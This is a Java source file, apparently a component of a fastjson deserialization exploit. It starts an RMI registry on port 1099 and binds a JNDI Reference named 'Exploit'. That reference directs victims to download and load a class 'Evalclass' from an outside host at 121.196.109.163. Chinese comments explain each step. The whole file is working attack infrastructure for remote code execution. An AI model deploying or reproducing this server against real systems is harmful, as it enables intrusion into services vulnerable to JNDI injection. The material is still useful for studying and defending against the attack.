package fasjsonxxxx;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class StartRmi {
    public static void main(String[] args) throws Exception{
        //在本机1099端口开启rmi registry。
        Registry registry = LocateRegistry.createRegistry(1099);
//配置一个reference
//第一个参数是className
//第二个参数指定 Object Factory的类名,第三个参数是codebase，如果Object Factory在classpath 里面找不到则去codebase下载。
//Object Factory类指定需要注意包路径，根据你的实际情况决定是否需要添加包名前缀。
        Reference reference = new Reference("Evalclass", "Evalclass","http://121.196.109.163:80/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
//绑定远程对像到Exploit，实际上就是给Hashtable里面put这个key和value。
        registry.bind("Exploit",referenceWrapper);
    }
}
